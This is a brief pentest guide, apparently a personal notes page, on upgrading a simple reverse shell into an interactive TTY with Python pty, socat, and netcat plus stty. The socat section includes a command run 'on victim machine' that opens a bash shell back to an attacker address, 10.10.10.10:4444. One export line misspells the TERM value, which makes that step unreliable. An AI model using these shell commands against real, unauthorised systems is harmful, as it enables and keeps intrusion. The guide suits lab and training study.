---
title: Upgrading Simple Shells to Fully Interactive TTYs
tags:
  - guide
aliases:
  - upgrade_shell
---

#### Author: **lomar**

---

# # Method 1: Python pty module
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
or
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

# Method 2: Using socat
**On your own machine:**
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
**On victim machine:**
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
```
If `socat` is not installed on victim machine, you can download is and upload to victim machine from [this](https://github.com/andrew-d/static-binaries)Github repository.
# Method 3: Upgrading from netcat with magic
## Background The Reverse Shell
First you have to background your shell, to do this `CTRL+Z`
## TERM
Second get your `TERM` type, for this you can use the command:
```bash
echo $TERM
xterm-256color
```
now you have got your `TERM` type.
## STTY
Third you have to get information of your `stty`, to do this run this command:
```bash
stty -a
speed 38400 baud; rows 52; columns 236; line = 0;  
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;  
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts  
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon ixoff -iuclc -ixany -imaxbel iutf8  
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0  
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
```


> [!summary]
> TERM is xterm-256color. Rows 52 and olumns 236

## Get Back
To get back to reverse shell run the commands respectively:
```bash
stty raw -echo
```
and 
```bash
fg
```
When the reverse shell command re-executed *(e.g `nc -nvlp 4444`)* run:
```bash
reset
```
after reset command it looks like normal again, however lastly you have to run these commands respectively:
```bash
export SHELL=bash
export TERM=xterm256-color
stty rows 52 columns 236
```
# Conclusion
Now you reverse shell is as interactive as `SSH` shell!